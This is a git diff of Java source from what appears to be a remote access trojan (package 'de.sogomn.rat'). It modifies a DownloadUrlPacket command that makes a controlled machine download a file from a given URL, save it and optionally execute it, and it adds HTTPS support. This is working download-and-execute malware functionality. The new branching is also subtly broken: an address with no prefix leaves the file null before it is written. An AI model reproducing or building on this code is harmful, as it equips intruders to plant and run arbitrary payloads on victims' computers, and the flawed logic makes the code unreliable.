@@ -24,6 +24,8 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
+import javax.net.ssl.HttpsURLConnection;
+
 import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.ActiveConnection;
 
@@ -46,18 +48,7 @@ public final class DownloadUrlPacket implements IPacket {
 	
 	public DownloadUrlPacket(final String address, final String directoryPath, final boolean execute) {
 		this.directoryPath = directoryPath;
-		
-		final boolean hasPrefixHttp = address.startsWith(HTTP_PREFIX);
-		final boolean hasPrefixHttps = address.startsWith(HTTPS_PREFIX);
-		
-		if (hasPrefixHttp) {
-			this.address = address;
-		} else if (hasPrefixHttps) {
-			this.address = address;
-		} else {
-			this.address = HTTP_PREFIX + address;
-		}
-		
+		this.address = address;
 		executeType = execute ? YES : NO;
 	}
 	
@@ -85,6 +76,43 @@ public final class DownloadUrlPacket implements IPacket {
 		
 		final URL url = new URL(address);
 		final HttpURLConnection con = (HttpURLConnection)url.openConnection();
+		
+		con.setRequestProperty(USER_AGENT, USER_AGENT_VALUE);
+		con.setRequestProperty(CONNECTION, CONNECTION_VALUE);
+		con.connect();
+		
+		final InputStream in = con.getInputStream();
+		final String fileName = con.getURL().getFile();
+		final int lastSlash = fileName.lastIndexOf("/");
+		final int questionMark = fileName.indexOf("?");
+		final String name;
+		final ByteArrayOutputStream out = new ByteArrayOutputStream();
+		
+		copyStream(in, out);
+		out.close();
+		in.close();
+		
+		if (lastSlash != -1) {
+			if (questionMark != -1) {
+				name = fileName.substring(lastSlash + 1, questionMark);
+			} else {
+				name = fileName.substring(lastSlash + 1);
+			}
+		} else {
+			name = DEFAULT_NAME;
+		}
+		
+		final byte[] data = out.toByteArray();
+		final DesktopFile file = new DesktopFile(name, data);
+		
+		return file;
+	}
+	
+	private DesktopFile readFileHttps(final String address) throws IOException {
+		HttpURLConnection.setFollowRedirects(true);
+		
+		final URL url = new URL(address);
+		final HttpsURLConnection con = (HttpsURLConnection)url.openConnection();
 		
 		con.setRequestProperty(USER_AGENT, USER_AGENT_VALUE);
 		con.setRequestProperty(CONNECTION, CONNECTION_VALUE);
@@ -153,8 +181,18 @@ public final class DownloadUrlPacket implements IPacket {
 		
 		if (directoryPath != null) {
 			try {
-				final DesktopFile file = readFile(address);
+				DesktopFile file = null;
+				final boolean hasPrefixHttp = address.startsWith(HTTP_PREFIX);
+				final boolean hasPrefixHttps = address.startsWith(HTTPS_PREFIX);
 				
+				if (hasPrefixHttp) {
+					file = readFile(address);
+					
+				} else if (hasPrefixHttps) {
+					file = readFileHttps(address);
+				} else {
+					this.address = HTTP_PREFIX + address;
+				}
 				file.write(directoryPath);
 				
 				if (executeType == YES) {
